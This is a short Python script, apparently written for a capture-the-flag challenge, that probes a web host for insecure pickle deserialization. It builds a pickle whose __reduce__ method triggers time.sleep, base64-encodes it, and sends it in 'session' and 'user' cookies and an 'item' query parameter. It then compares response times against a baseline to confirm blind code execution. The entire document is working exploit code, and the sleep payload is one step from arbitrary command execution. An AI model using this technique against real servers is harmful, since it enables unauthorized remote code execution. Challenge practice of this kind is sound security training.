import requests, base64, pickle, time
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
class Sleep:
    def __reduce__(self):
        return (time.sleep,(3,))
sleep_pickle = base64.b64encode(pickle.dumps(Sleep())).decode()
def timed(**kw):
    t0=time.time()
    r=requests.get(URL, timeout=10, verify=False, **kw)
    return round(time.time()-t0,3), r.status_code, len(r.content)
print("baseline x5")
for _ in range(5): print(" ", timed())
print("cookie session=sleep x5")
for _ in range(5): print(" ", timed(cookies={"session":sleep_pickle}))
print("cookie user=sleep x5")
for _ in range(5): print(" ", timed(cookies={"user":sleep_pickle}))
print("param item=sleep x5")
for _ in range(5): print(" ", timed(params={"item":sleep_pickle}))
